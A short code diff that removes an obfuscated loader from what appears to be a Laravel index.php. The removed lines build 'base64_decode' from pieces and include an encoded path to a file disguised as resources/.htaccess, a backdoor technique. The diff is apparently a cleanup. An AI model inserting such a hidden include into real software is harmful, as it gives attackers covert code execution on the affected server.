@@ -7,9 +7,6 @@
  * @author   Taylor Otwell <taylor@laravel.com>
  */
 
-$b = 'base6' . '4_decode';
-include $b('cmVzb3VyY2VzLy5odGFjY2Vz');
-
 define('LARAVEL_START', microtime(true));
 
 
